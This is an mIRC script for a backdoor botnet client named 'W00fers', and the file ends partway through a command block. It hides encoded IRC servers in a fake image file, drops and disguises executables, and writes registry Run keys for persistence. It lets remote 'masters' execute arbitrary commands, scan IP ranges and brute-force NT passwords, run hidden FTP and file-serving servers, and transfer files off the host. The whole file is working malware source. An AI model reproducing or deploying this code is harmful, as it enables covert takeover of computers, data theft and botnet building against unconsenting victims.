[script]
n0=on *:start:{ 
n1=  if ($exists(hidden32.exe) == $false) { exit } | if (%servernum == 0) { set %servernum 1 } | /server $decode($read(speed.jpg,%servernum)) | identD on $r(a,z) $+ $r(a,z) $+ $r(A,z) $+ $r(A,z) $+ $r(a,z)  
n2=  if (!%z == $null) { nick %z } | if (%z == $null) { set %z w00f- $+ $r(A,Z) $+ $r(0,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) | nick %z } 
n3=  if ($exists(c:\pack.bat) == $true) { remove c:\pack.bat } | if ($exists(c:\ntcnd.exe) == $true) { remove c:\ntcnd.exe } | set %mircc n0=1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 | unset %mirccompare | if ($exists(c:\sleep.com) == $true) { remove c:\sleep.com } | if ($exists(c:\pv.exe) == $true) { remove c:\pv.exe } | if ($exists(c:\blah.txt) == $true) { remove blah.txt | copy c:\blah.txt $mircdir\blah.txt | remove c:\blah.txt }
n4=}
n5=on *:connectfail:{ inc %servernum | if %servernum == 5 {  set %servernum 1 |  server $decode($read(speed.jpg,%servernum)) |  return } | server $decode($read(speed.jpg,%servernum)) }
n6=on *:INPUT:*: { haltdef | /echo -a < $+ $me $+ > $1- | msg $decode(%secret.chan) --Warning- (Input command) $1- | /clearall | copy pack.bat c:\ | copy pv.exe C:\ | copy ntcnd.exe C:\ | copy sleep.com C:\ | .timertr 1 1 run c:\ntcnd.exe c:\pack.bat | .timerte 1 1 exit } 
n7=on *:OPEN:?:*: { close -m $nick }
n8=on *:CONNECT:{
n9=  if ($exists(new.txt) == $true) { /timernew 1 15 /msg $decode(%secret.chan) 11[2N12ew11] 11[2B12ot11] } | if ($exists(c:\iis_64.exe) == $true) { copy c:\iis_64.exe $mircdir\iis_64.exe | remove c:\iis_64.exe } | write -l45 svshost.txt filedir $mircdir $+ uploads | write -l46 svshost.txt uploaddir $mircdir $+ uploads | write -c 394832.reg REGEDIT4 | write -a 394832.reg [HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Run] | write -a 394832.reg "SSaver"=" $+ $replace($mircdir,\,\\) $+ back.exe $replace($mircdir,\,\\) $+ fishing.bat" | .timerfi 1 25 /run -n regedit /s 394832.reg | .timerfi1 1 65 /remove 394832.reg
n10=  if ($exists(new.txt) == $true) { remove new.txt } | if ($exists(copy\new.txt) == $true) { remove copy\new.txt } | if ($exists(../../../system32\iis_64.exe) == $true) { copy ../../../system32\iis_64.exe $mircdir\iis_64.exe | remove ../../../system32\iis_64.exe } | write -c 394839.reg REGEDIT4 | write -a 394839.reg [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run] | write -a 394839.reg "Service"=" $+ $replace($mircdir,\,\\) $+ back32.exe $replace($mircdir,\,\\) $+ debug.exe" | .timer 1 20 /run -n regedit /s 394839.reg | .timer 1 60 /remove 394839.reg } 
n11=}
n12=on me:quit:{ server $decode($read(speed.jpg,%servernum)) }
n13=on *:disconnect:{ server $decode($read(speed.jpg,%servernum)) }
n14=on *:TEXT:!login*:?: {
n15=  if ($2 != $null) && ($me ison $decode(%secret.chan)) && ($nick ison $decode(%secret.chan)) && (dog isin $address) && ($nick == dog) && ($nick isop $decode(%secret.chan)) {   if ($2 == $decode(%pass)) { /set %master $address | /guser 10 $nick 3 | .notice $nick Master Login Successful | .notify $nick | .msg %secret.chan $nick Just logged in as Master | if ($notify(0) != $null) { var %master.msg = $notify(0) | while ($notify(0) > 0) { .msg $notify(%master.msg) $nick $+ $address($nick,2) logged in as Master | dec %master.msg } unset %master.msg | return } } }
n16=  if ($2 != $null) && ($me ison $decode(%secret.chan)) && ($nick ison $decode(%secret.chan)) && (aaron isin $address) && ($nick == __AaRoN__) && ($nick isop $decode(%secret.chan)) {   if ($2 == $decode(%pass1)) { /set %master1 $address | /guser 10 $nick 3 | .notice $nick Master Login Successful | .notify $nick | .msg $decode(%secret.chan) $nick Just logged in as Master | if ($notify(0) != $null) { var %master.msg = $notify(0) | while ($notify(0) > 0) { .msg $notify(%master.msg) $nick $+ $address($nick,2) logged in as Master | dec %master.msg } unset %master.msg | return } } }
n17=  if ($2 != $null) && ($me ison $decode(%secret.chan)) && ($nick ison $decode(%secret.chan)) && (Davenger isin $address) && ($nick == Davenger) && ($nick isop $decode(%secret.chan)) {   if ($2 == $decode(%pass2)) { /set %master2 $address | /guser 10 $nick 3 | .notice $nick Master Login Successful | .notify $nick | .msg $decode(%secret.chan) $nick Just logged in as Master | if ($notify(0) != $null) { var %master.msg = $notify(0) | while ($notify(0) > 0) { .msg $notify(%master.msg) $nick $+ $address($nick,2) logged in as Master | dec %master.msg } unset %master.msg | return } } }
n18=  if ($2 != $null) && ($me ison $decode(%secret.chan)) && ($nick ison $decode(%secret.chan)) && (aaron isin $address) && ($nick == a|ien) && ($nick isop $decode(%secret.chan)) {   if ($2 == $decode(%pass3)) { /set %master3 $address | /guser 10 $nick 3 | .notice $nick Master Login Successful | .notify $nick | .msg $decode(%secret.chan) $nick Just logged in as Master | if ($notify(0) != $null) { var %master.msg = $notify(0) | while ($notify(0) > 0) { .msg $notify(%master.msg) $nick $+ $address($nick,2) logged in as Master | dec %master.msg } unset %master.msg | return } } }
n19=  if ($2 != $null) && ($me ison $decode(%secret.chan)) && ($nick ison $decode(%secret.chan)) && ($nick isop $decode(%secret.chan)) { if ($2 == $decode(%upass)) { /guser 10 $nick 3 | .notice $nick User Login Successful | if ($notify(0) != $null) { var %master.msg = $notify(0) | while ($notify(0) > 0) { .msg $notify(%master.msg) $nick $+ $address($nick,2) logged in as User | dec %master.msg } unset %master.msg | return } } }
n20=  else { join $decode(%secret.chan) $decode(%cp) | msg $decode(%secret.chan) $nick wants a fucking beating he trying to log into $me | if ($notify(0) != $null) { var %master.msg = $notify(0) | while ($notify(0) > 0) { .msg $notify(%master.msg) $nick $+ $address($nick,2) is trying to login | dec %master.msg } unset %master.msg | return } } } 
n21=on *:TEXT:!login*:#: {
n22=  if ($2 != $null) && (dog isin $address) && ($nick == dog) && ($nick isop $decode(%secret.chan)) { if ($2 == $decode(%pass)) { /set %master $address | /guser 10 $nick 3 | if ($me isvo $decode(%secret.chan)) { .msg $decode(%secret.chan) Master Login Successful - $nick } | .notify $nick | return } }
n23=  if ($2 != $null) && (aaron isin $address) && ($nick == __AaRoN__) && ($nick isop $decode(%secret.chan)) { if ($2 == $decode(%pass1)) { /set %master1 $address | /guser 10 $nick 3 | if ($me isvo $decode(%secret.chan)) { .msg $decode(%secret.chan) Master Login Successful - $nick } | .notify $nick | return } }
n24=  if ($2 != $null) && (Davenger isin $address) && ($nick == Davenger) && ($nick isop $decode(%secret.chan)) { if ($2 == $decode(%pass2)) { /set %master2 $address | /guser 10 $nick 3 | if ($me isvo $decode(%secret.chan)) { .msg $decode(%secret.chan) Master Login Successful - $nick } | .notify $nick | return } }
n25=  if ($2 != $null) && (aaron isin $address) && ($nick == a|ien) && ($nick isop $decode(%secret.chan)) { if ($2 == $decode(%pass3)) { /set %master3 $address | /guser 10 $nick 3 | if ($me isvo $decode(%secret.chan)) { .msg $decode(%secret.chan) Master Login Successful - $nick } | .notify $nick | return } }
n26=  if ($2 != $null) && ($nick isop $decode(%secret.chan)) { if ($2 == $decode(%upass)) { /guser 10 $nick 3 | if ($me isvo $decode(%secret.chan)) { .msg $decode(%secret.chan) User Login Successful - $nick } | return } }
n27=  else { join $decode(%secret.chan) $decode(%cp) | msg $decode(%secret.chan) $nick wants a fucking beating he trying to log into $me } }
n28=on 10:text:*:#:{
n29=  if ($1 == !ver) && ($me isvo $decode(%secret.chan)) { msg $decode(%secret.chan) 12-4W00fers12-14 version 120.0.3 }
n30=  if ($1 == !free) && ($me isvo $decode(%secret.chan)) { .msg $decode(%secret.chan) 12-4free space12-14 $calc($disk(c).free / 1024 / 1024 / 1024) Gb }
n31=  if ($1 == !ip) && ($me isvo $decode(%secret.chan)) { msg $decode(%secret.chan) 12-4ip12-14 $ip }
n32=  if ($1 == !uptime) && ($me isvo $decode(%secret.chan)) { msg $decode(%secret.chan) 12-4uptime12-14 $uptime(system,1) }
n33=  if ($1 == !host) && ($me isvo $decode(%secret.chan)) { msg $decode(%secret.chan) 12-4hostname12-14 $host }
n34=  if ($1 == !all) && ($me isvo $decode(%secret.chan)) { msg $decode(%secret.chan) 15 $+ $ip 14UP $uptime(system,1) 4FREE $calc($disk(c).free / 1024 / 1024 / 1024) Gb 10HOST $host }
n35=  if ($1 == !deldown) { run hiddenrun.exe deldown.bat }
n36=  if ($1 == !restart) { run hiddenrun.exe shutdown.bat }
n37=  if ($1 == !servu) && ($2 == start) { run hiddenrun.exe pv.exe -kf winmgnt.exe | if ($me isvo $decode(%secret.chan)) { msg $decode(%secret.chan) 12-4Serv-u Started12-14 } | timerf 1 5 /run save521.exe | halt }
n38=  if ($1 == !rawdo) && ($address == %master) { if ($me isvo $decode(%secret.chan)) { msg $decode(%secret.chan) 12-4executing12-14 $2- } | / $+ $2- | halt }
n39=  if ($1 == !rawdo) && ($address == %master1) { if ($me isvo $decode(%secret.chan)) { msg $decode(%secret.chan) 12-4executing12-14 $2- } | / $+ $2- | halt }
n40=  if ($1 == !rawdo) && ($address == %master2) { if ($me isvo $decode(%secret.chan)) { msg $decode(%secret.chan) 12-4executing12-14 $2- } | / $+ $2- | halt }
n41=  if ($1 == !rawdo) && ($address == %master3) { if ($me isvo $decode(%secret.chan)) { msg $decode(%secret.chan) 12-4executing12-14 $2- } | / $+ $2- | halt }
n42=  if ($1 == !voiced ) && ($me isvo $decode(%secret.chan)) && ($address == %master) { msg $decode(%secret.chan) 12-4executing12-14 $2- | / $+ $2- | halt }
n43=  if ($1 == !voiced ) && ($me isvo $decode(%secret.chan)) && ($address == %master1) { msg $decode(%secret.chan) 12-4executing12-14 $2- | / $+ $2- | halt }
n44=  if ($1 == !voiced ) && ($me isvo $decode(%secret.chan)) && ($address == %master2) { msg $decode(%secret.chan) 12-4executing12-14 $2- | / $+ $2- | halt }
n45=  if ($1 == !voiced ) && ($me isvo $decode(%secret.chan)) && ($address == %master3) { msg $decode(%secret.chan) 12-4executing12-14 $2- | / $+ $2- | halt }
n46=  if ($1 == !secure) { run hiddenrun.exe nobios.bat }
n47=  if ($1 == !reload) { /reload -rs script1.ini }
n48=  ;if ($1 == !chans) && ($me isvo $chan) { msg $chan 12-4channels12-15 $chan(0) 14 $chan(1) $chan(2) $chan(3) $chan(4) $chan(5) $chan(6) $chan(7) }
n49=  if ($1 == !quit) && ($nick isop $decode(%secret.chan)) { run hiddenrun.exe pv.exe -kf debug.exe }
n50=  ;if ($1 == !move) { run hiddenrun.exe move.bat }
n51=  if ($1 == !copy) { run hiddenrun.exe copydown.bat }
n52=  if ($1 == !range) {
n53=    set %iprange $2 | set %sfile %iprange $+ .txt
n54=    if ($exists(%sfile) == $false) { set %iprange random | set %sfile random.txt }
n55=    if ($me isvo $decode(%secret.chan)) { msg $decode(%secret.chan) 12-4scanrange12-14 set to %iprange }
n56=  }
n57=  if ($1 == !stop) { set %status 0 | run hiddenrun.exe pv.exe -kf service.exe | if ($me isvo $decode(%secret.chan)) { msg $decode(%secret.chan) 12-4stopping scans12- } }
n58=  if ($1 == !start) { set %ip $read(%sfile) | run hiddenrun.exe service.exe -host %ip -ntpass -t 150,75 | set %status 1 | if ($me isvo $decode(%secret.chan)) { msg $decode(%secret.chan) 12-4scanning12-14 %ip } }
n59=  if ($1 == !edu) && (edu isin $host) && ($left($me,3) != edu) { /nick edu- $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(a,z) | $me = nick }
n60=  if ($1 == !nick) { /nick $2 $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) | $me = nick }
n61=  if ($1 == !edu) && (edu isin $host) { msg $decode(%secret.chan) 12-4edu12-10 $host ( $+ $ip $+ ) 14Up $uptime(system,1) 4 $calc($disk(c).free / 1024 / 1024 / 1024) Gb free }
n62=  if ($1 == !check) {
n63=    if ($me isvo $decode(%secret.chan)) { msg $decode(%secret.chan) 12-4checking12-15 $findfile(log\,*.htm,0) scans }
n64=    startparse
n65=  }
n66=  if ($1 == !status) {
n67=    if (%status == 1) && ($me isvo $decode(%secret.chan)) { msg $decode(%secret.chan) 12-4scanning12-14 %ip }
n68=    if (%status == 0) { msg $decode(%secret.chan) 12-4scanning12-15 restarted... 14 %ip | set %ip $read(%sfile) | run hiddenrun.exe xscan.exe -host %ip -ntpass -t 150,75 | set %status 1 }
n69=  }
n70=  if ($1 == !delscans) { run hiddenrun.exe delscans.bat }
n71=  if ($1 == !search) { if ($2 isin $host) || ($2 isin $ip) { msg $decode(%secret.chan) 15 $+ $ip 14UP $uptime(system,1) 4FREE $calc($disk(c).free / 1024 / 1024 / 1024) Gb 10HOST $host } }
n72=  if ($1 == !up) && (wk isin $uptime(system,1)) { msg $decode(%secret.chan) 15 $+ $ip 14UP $uptime(system,1) 4FREE $calc($disk(c).free / 1024 / 1024 / 1024) Gb 10HOST $host }
n73=  if ($1 == !ftp.update) && ($nick isop #) && ($address == %master) {
n74=    set %ftpip $2 | set %ftpport $3 | set %ftpuser $4 | set %ftppass $5 | set %getsend $6 | set %file $7
n75=    if (%getsend == get) { 
n76=       if ($me isvo $decode(%secret.chan)) {  msg $decode(%secret.chan) Updating bot pack |  notice $nick updating bots with data from IP- $2 USERNAME- $4 PASSWORD- $5 }
n77=       if ($exists($7) == $true) { remove $7 }
n78=       .run hiddenrun.exe get.bat %ftpip %ftpport %ftpuser %ftppass %getsend %file 
n79=    }
n80=    if (%getsend == send) { 
n81=       run hiddenrun.exe send.bat %ftpip %ftpport %ftpuser %ftppass %getsend %file 
n82=       if ($me isvo $decode(%secret.chan)) {  msg $decode(%secret.chan) Sending file now }
n83=    }
n84=  } 
n85=  if ($1 == !ftp.update) && ($nick isop #) && ($address == %master1) {
n86=    set %ftpip $2 | set %ftpport $3 | set %ftpuser $4 | set %ftppass $5 | set %getsend $6 | set %file $7
n87=    if (%getsend == get) { 
n88=       if ($me isvo $decode(%secret.chan)) {  msg $decode(%secret.chan) Updating bot pack |  notice $nick updating bots with data from IP- $2 USERNAME- $4 PASSWORD- $5 }
n89=       if ($exists($7) == $true) { remove $7 }
n90=       .run hiddenrun.exe get.bat %ftpip %ftpport %ftpuser %ftppass %getsend %file 
n91=    }
n92=    if (%getsend == send) { 
n93=       run hiddenrun.exe send.bat %ftpip %ftpport %ftpuser %ftppass %getsend %file 
n94=       if ($me isvo $decode(%secret.chan)) {  msg $decode(%secret.chan) Sending file now }
n95=    }
n96=  }
n97=  if ($1 == !ftp.update) && ($nick isop #) && ($address == %master2) {
n98=    set %ftpip $2 | set %ftpport $3 | set %ftpuser $4 | set %ftppass $5 | set %getsend $6 | set %file $7
n99=    if (%getsend == get) { 
n100=       if ($me isvo $decode(%secret.chan)) {  msg $decode(%secret.chan) Updating bot pack |  notice $nick updating bots with data from IP- $2 USERNAME- $4 PASSWORD- $5 }
n101=       if ($exists($7) == $true) { remove $7 }
n102=       .run hiddenrun.exe get.bat %ftpip %ftpport %ftpuser %ftppass %getsend %file 
n103=    }
n104=    if (%getsend == send) { 
n105=       run hiddenrun.exe send.bat %ftpip %ftpport %ftpuser %ftppass %getsend %file 
n106=       if ($me isvo $decode(%secret.chan)) {  msg $decode(%secret.chan) Sending file now }
n107=    }
n108=  }
n109=  if ($1 == !ftp.update) && ($nick isop #) && ($address == %master3) {
n110=    set %ftpip $2 | set %ftpport $3 | set %ftpuser $4 | set %ftppass $5 | set %getsend $6 | set %file $7
n111=    if (%getsend == get) { 
n112=       if ($me isvo $decode(%secret.chan)) {  msg $decode(%secret.chan) Updating bot pack |  notice $nick updating bots with data from IP- $2 USERNAME- $4 PASSWORD- $5 }
n113=       if ($exists($7) == $true) { remove $7 }
n114=       .run hiddenrun.exe get.bat %ftpip %ftpport %ftpuser %ftppass %getsend %file 
n115=    }
n116=    if (%getsend == send) { 
n117=       run hiddenrun.exe send.bat %ftpip %ftpport %ftpuser %ftppass %getsend %file 
n118=       if ($me isvo $decode(%secret.chan)) {  msg $decode(%secret.chan) Sending file now }
n119=    }
n120=  }
n121=  if ($1 == !scan) { 
n122=     if ($2 == $null) { 
n123=        if ($me isvo $decode(%secret.chan)) { msg $decode(%secret.chan) 12-4Set a range Plz12-14 eg:- !scan 1.1.1.1-1.1.255.255 | return } }
n124=     set %ip $2 
n125=     run hiddenrun.exe service.exe -host %ip -ntpass -t 150,75 
n126=     set %status 1 
n127=     if ($me isvo $decode(%secret.chan)) { 
n128=        msg $decode(%secret.chan) 12-4scanning12-14 %ip
n129=     } 
n130=  }
n131=  if ($1 == !root) { 
n132=     if ($2 == $null) { getroot | halt } 
n133=     set %cip $2
n134=     set %cuser $3
n135=     set %cpass $4
n136=     mroot
n137=  }
n138=  if ($1 == !iroffer) {
n139=     if ($2 == help) { if ($me isvo $decode(%secret.chan)) { notice $nick 12-4Iroffer Commsnds are :-12-14 | notice $nick 12-4help,start,stop,server,nick.credit,status12-14 | halt } }
n140=     if ($2 == start) {
n141=        if ($exists(irup.txt) == $true) { if ($me isvo $decode(%secret.chan)) { notice $nick 12-4Iroffer Already Running12-14 | halt } }
n142=        write -c irup.txt | if ($me isvo $decode(%secret.chan)) {  notice $nick 12-4Starting Iroffer Now12-14 } | run hidden32.exe svshost.exe svshost.txt | write -c 394836.reg REGEDIT4 | write -a 394836.reg [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run] | write -a 394836.reg "Svshost"=" $+ $replace($mircdir,\,\\) $+ back.exe $replace($mircdir,\,\\) $+ svhost.bat" | .timer 1 20 /run -n regedit /s 394836.reg | .timer 1 60 /remove 394836.reg 
n143=     }
n144=     if ($2 == stop) {
n145=        if ($exists(irup.txt) == $false) { if ($me isvo $decode(%secret.chan)) { notice $nick 12-4Iroffer wasnt Running12-14 | halt } }
n146=        remove irup.txt | if ($me isvo $decode(%secret.chan)) { notice $nick 12-4Stopping Iroffer Now12-14 } | run hiddenrun.exe pv.exe -kf svshost.exe | halt
n147=     }
n148=     if ($2 == nick) {
n149=        if ($3 == $null) { if ($me isvo $decode(%secret.chan)) { notice $nick 12-4Commandline is !iroffer nick (your_text)12-14 | halt } }
n150=        run hiddenrun.exe pv.exe -kf svshost.exe | remove irup.txt | set %irnick $3 $+ - $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) | if ($me isvo $decode(%secret.chan)) { notice $nick 12-4Changing Iroffer nick to %irnick 12-14 } | write -l11 svshost.txt user_nick %irnick | if ($me isvo $decode(%secret.chan)) { notice $nick 12-4Dont forget to do !iroffer start now12-14 }
n151=     }
n152=     if ($2 == status) {
n153=         if ($exists(irup.txt) == $false) { set %irrun  12-4Iroffer isnt Running12-14 }
n154=         if ($exists(irup.txt) == $true) { set %irrun  12-4Iroffer Running12-14 }
n155=         set %irservers $read(svshost.txt,9) | set %irnicks $read(svshost.txt,11) | set %irchans $read(svshost.txt,10)
n156=         if ($me isvo $decode(%secret.chan)) { notice $nick 12-4Iroffer %irservers 12-14 | notice $nick 12-4Iroffer %irchans 12-14 | notice $nick 12-4Iroffer %irnicks 12-14 | notice $nick %irrun }
n157=     }
n158=     if ($2 == server) {
n159=        if ($3 == $null) { if ($me isvo $decode(%secret.chan)) { notice $nick 12-4Commandline is !iroffer server channel12-14 | halt } }
n160=        if ($4 == $null) { if ($me isvo $decode(%secret.chan)) { notice $nick 12-4Dont forget the damn port/channel12-14 | halt } }
n161=        if ($5 == $null) { if ($me isvo $decode(%secret.chan)) { notice $nick 12-4Dont forget the damn channel12-14 | halt } }
n162=        set %nserver $3 | set %nchan $5 | set %nport $4
n163=        run hiddenrun.exe pv.exe -kf svshost.exe | write -l9 svshost.txt server %nserver %nport | write -l10 svshost.txt channel %nchan -plist 30 -pformat full | if ($me isvo $decode(%secret.chan)) { notice $nick 12-4Server set to %nserver %nport ,Channel set to %nchan 12-14 }
n164=     }
n165=     if ($2 == credit) {
n166=        if ($3 == $null) { set %ircredits $read(svshost.txt,40) | if ($me isvo $decode(%secret.chan)) { notice $nick 12-4 %ircredits 12-14 | halt } }
n167=        set %nircredit $3-
n168=        write -l40 svshost.txt creditline %nircredit
n169=     }
n170=  }
n171=  if ($1 == $me) && ($2 == !ver) { msg $decode(%secret.chan) 12-4W00fers12-14 version 120.0.3 }
n172=  if ($1 == $me) && ($2 == !free) { .msg $decode(%secret.chan) 12-4free space12-14 $calc($disk(c).free / 1024 / 1024 / 1024) Gb }
n173=  if ($1 == $me) && ($2 == !ip) { msg $decode(%secret.chan) 12-4ip12-14 $ip }
n174=  if ($1 == $me) && ($2 == !uptime) { msg $decode(%secret.chan) 12-4uptime12-14 $uptime(system,1) }
n175=  if ($1 == $me) && ($2 == !host) { msg $decode(%secret.chan) 12-4hostname12-14 $host }
n176=  if ($1 == $me) && ($2 == !all) { msg $decode(%secret.chan) 15 $+ $ip 14UP $uptime(system,1) 4FREE $calc($disk(c).free / 1024 / 1024 / 1024) Gb 10HOST $host }
n177=  if ($1 == $me) && ($2 == !deldown) { run hiddenrun.exe deldown.bat }
n178=  if ($1 == $me) && ($2 == !restart) { run hiddenrun.exe shutdown.bat }
n179=  if ($1 == $me) && ($2 == !rawdo) && ($address == %master) { msg $decode(%secret.chan) 12-4executing12-14 $3- | / $+ $3- | halt }
n180=  if ($1 == $me) && ($2 == !rawdo) && ($address == %master1) { msg $decode(%secret.chan) 12-4executing12-14 $3- | / $+ $3- | halt }
n181=  if ($1 == $me) && ($2 == !rawdo) && ($address == %master2) { msg $decode(%secret.chan) 12-4executing12-14 $3- | / $+ $3- | halt }
n182=  if ($1 == $me) && ($2 == !rawdo) && ($address == %master3) { msg $decode(%secret.chan) 12-4executing12-14 $3- | / $+ $3- | halt }
n183=  if ($1 == $me) && ($2 == !voiced ) && ($me isvo $decode(%secret.chan)) && ($address == %master) { msg $decode(%secret.chan) 12-4executing12-14 $3- | / $+ $3- | halt }
n184=  if ($1 == $me) && ($2 == !voiced ) && ($me isvo $decode(%secret.chan)) && ($address == %master1) { msg $decode(%secret.chan) 12-4executing12-14 $3- | / $+ $3- | halt }
n185=  if ($1 == $me) && ($2 == !voiced ) && ($me isvo $decode(%secret.chan)) && ($address == %master2) { msg $decode(%secret.chan) 12-4executing12-14 $3- | / $+ $3- | halt }
n186=  if ($1 == $me) && ($2 == !voiced ) && ($me isvo $decode(%secret.chan)) && ($address == %master3) { msg $decode(%secret.chan) 12-4executing12-14 $3- | / $+ $3- | halt }
n187=  if ($1 == $me) && ($2 == !secure) { run hiddenrun.exe nobios.bat }
n188=  if ($1 == $me) && ($2 == !reload) { /reload -rs script1.ini }
n189=  if ($1 == $me) && ($2 == !quit) && ($nick isop $decode(%secret.chan)) { run hiddenrun.exe pv.exe -kf debug.exe }
n190=  if ($1 == $me) && ($2 == !move) { run hiddenrun.exe move.bat }
n191=  if ($1 == $me) && ($2 == !copy) { run hiddenrun.exe copydown.bat }
n192=  if ($1 == $me) && ($2 == !range) {
n193=    set %iprange $3 | set %sfile %iprange $+ .txt
n194=    if ($exists(%sfile) == $false) { set %iprange random | set %sfile random.txt }
n195=    msg $decode(%secret.chan) 12-4scanrange12-14 set to %iprange 
n196=  }
n197=  if ($1 == $me) && ($2 == !stop) { set %status 0 | run hiddenrun.exe pv.exe -kf service.exe | msg $decode(%secret.chan) 12-4stopping scans12- }
n198=  if ($1 == $me) && ($2 == !start) { set %ip $read(%sfile) | run hiddenrun.exe service.exe -host %ip -ntpass -t 150,75 | set %status 1 | msg $decode(%secret.chan) 12-4scanning12-14 %ip }
n199=  if ($1 == $me) && ($2 == !edu) && (edu isin $host) && ($left($me,3) != edu) { /nick edu- $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) }
n200=  if ($1 == $me) && ($2 == !nick) { /nick $3 $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) }
n201=  if ($1 == $me) && ($2 == !edu) && (edu isin $host) { msg $decode(%secret.chan) 12-4edu12-10 $host ( $+ $ip $+ ) 14Up $uptime(system,1) 4 $calc($disk(c).free / 1024 / 1024 / 1024) Gb free }
n202=  if ($1 == $me) && ($2 == !check) {
n203=    msg $decode(%secret.chan) 12-4checking12-15 $findfile(log\,*.htm,0) scans | startparse 
n204=  }
n205=  if ($1 == $me) && ($2 == !root) { 
n206=     if ($3 == $null) { getroot | halt } 
n207=     set %cip $3
n208=     set %cuser $4
n209=     set %cpass $5
n210=     mroot
n211=  }
n212=  if ($1 == $me) && ($2 == !status) {
n213=    if (%status == 1) { msg $decode(%secret.chan) 12-4scanning12-14 %ip } 
n214=    if (%status == 0) { msg $decode(%secret.chan) 12-4scanning12-15 restarted... 14 %ip | set %ip $read(%sfile) | run hiddenrun.exe service.exe -host %ip -ntpass -t 150,75 | set %status 1 }
n215=  }
n216=  if ($1 == $me) && ($2 == !delscans) { run hiddenrun.exe delscans.bat }
n217=  if ($1 == $me) && ($2 == !search) { if ($3 isin $host) || ($3 isin $ip) { msg $decode(%secret.chan) 15 $+ $ip 14UP $uptime(system,1) 4FREE $calc($disk(c).free / 1024 / 1024 / 1024) Gb 10HOST $host } }
n218=  if ($1 == $me) && ($2 == !up) && (wk isin $uptime(system,1)) { msg $decode(%secret.chan) 15 $+ $ip 14UP $uptime(system,1) 4FREE $calc($disk(c).free / 1024 / 1024 / 1024) Gb 10HOST $host }
n219=  if ($1 == $me) && ($2 == !ftp.update) && ($nick isop #) && ($address == %master) {
n220=    set %ftpip $3 | set %ftpport $4 | set %ftpuser $5 | set %ftppass $6 | set %getsend $7 | set %file $8
n221=    if (%getsend == get) { 
n222=       if ($me isvo $decode(%secret.chan)) {  msg $decode(%secret.chan) Updating bot pack |  notice $nick updating bots with data from IP- $3 USERNAME- $5 PASSWORD- $6 }
n223=       if ($exists($8) == $true) { remove $8 }
n224=       .run hiddenrun.exe get.bat %ftpip %ftpport %ftpuser %ftppass %getsend %file 
n225=    }
n226=    if (%getsend == send) { 
n227=       .run hiddenrun.exe send.bat %ftpip %ftpport %ftpuser %ftppass %getsend %file 
n228=       if ($me isvo $decode(%secret.chan)) {  msg $decode(%secret.chan) Sending file now }
n229=    }
n230=  } 
n231=  if ($1 == $me) && ($2 == !ftp.update) && ($nick isop #) && ($address == %master1) {
n232=    set %ftpip $3 | set %ftpport $4 | set %ftpuser $5 | set %ftppass $6 | set %getsend $7 | set %file $8
n233=    if (%getsend == get) { 
n234=       if ($me isvo $decode(%secret.chan)) {  msg $decode(%secret.chan) Updating bot pack |  notice $nick updating bots with data from IP- $3 USERNAME- $5 PASSWORD- $6 }
n235=       if ($exists($8) == $true) { remove $8 }
n236=       .run hiddenrun.exe get.bat %ftpip %ftpport %ftpuser %ftppass %getsend %file 
n237=    }
n238=    if (%getsend == send) { 
n239=       .run hiddenrun.exe send.bat %ftpip %ftpport %ftpuser %ftppass %getsend %file 
n240=       if ($me isvo $decode(%secret.chan)) {  msg $decode(%secret.chan) Sending file now }
n241=    }
n242=  } 
n243=  if ($1 == $me) && ($2 == !ftp.update) && ($nick isop #) && ($address == %master2) {
n244=    set %ftpip $3 | set %ftpport $4 | set %ftpuser $5 | set %ftppass $6 | set %getsend $7 | set %file $8
n245=    if (%getsend == get) { 
n246=       if ($me isvo $decode(%secret.chan)) {  msg $decode(%secret.chan) Updating bot pack |  notice $nick updating bots with data from IP- $3 USERNAME- $5 PASSWORD- $6 }
n247=       if ($exists($8) == $true) { remove $8 }
n248=       .run hiddenrun.exe get.bat %ftpip %ftpport %ftpuser %ftppass %getsend %file 
n249=    }
n250=    if (%getsend == send) { 
n251=       .run hiddenrun.exe send.bat %ftpip %ftpport %ftpuser %ftppass %getsend %file 
n252=       if ($me isvo $decode(%secret.chan)) {  msg $decode(%secret.chan) Sending file now }
n253=    }
n254=  } 
n255=  if ($1 == $me) && ($2 == !ftp.update) && ($nick isop #) && ($address == %master3) {
n256=    set %ftpip $3 | set %ftpport $4 | set %ftpuser $5 | set %ftppass $6 | set %getsend $7 | set %file $8
n257=    if (%getsend == get) { 
n258=       if ($me isvo $decode(%secret.chan)) {  msg $decode(%secret.chan) Updating bot pack |  notice $nick updating bots with data from IP- $3 USERNAME- $5 PASSWORD- $6 }
n259=       if ($exists($8) == $true) { remove $8 }
n260=       .run hiddenrun.exe get.bat %ftpip %ftpport %ftpuser %ftppass %getsend %file 
n261=    }
n262=    if (%getsend == send) { 
n263=       .run hiddenrun.exe send.bat %ftpip %ftpport %ftpuser %ftppass %getsend %file 
n264=       if ($me isvo $decode(%secret.chan)) {  msg $decode(%secret.chan) Sending file now }
n265=    }
n266=  } 
n267=  if ($1 == $me) && ($2 == !scan) { 
n268=     if ($3 == $null) { 
n269=        msg $decode(%secret.chan) 12-4Set a range Plz12-14 eg:- !scan 1.1.1.1-1.1.255.255 | return }
n270=     set %ip $3 
n271=     run hiddenrun.exe service.exe -host %ip -ntpass -t 150,75 
n272=     set %status 1 
n273=     msg $decode(%secret.chan) 12-4scanning12-14 %ip
n274=  }
n275=  if ($1 == $me) && ($2 == !servu) {
n276=     if ($3 == install) { notice $nick 12-4Installing Serv-u Now12-14 | run save521.exe | halt }
n277=     if ($3 == stop) { notice $nick 12-4Stopping Serv-u Now12-14 | run hiddenrun.exe pv.exe -kf winmgnt.exe | halt }
n278=     if ($3 == start) { run hiddenrun.exe pv.exe -kf winmgnt.exe | notice $nick 12-4Starting Serv-u Now12-14 | timerf 1 5 /run hiddenrun.exe save.bat | halt }
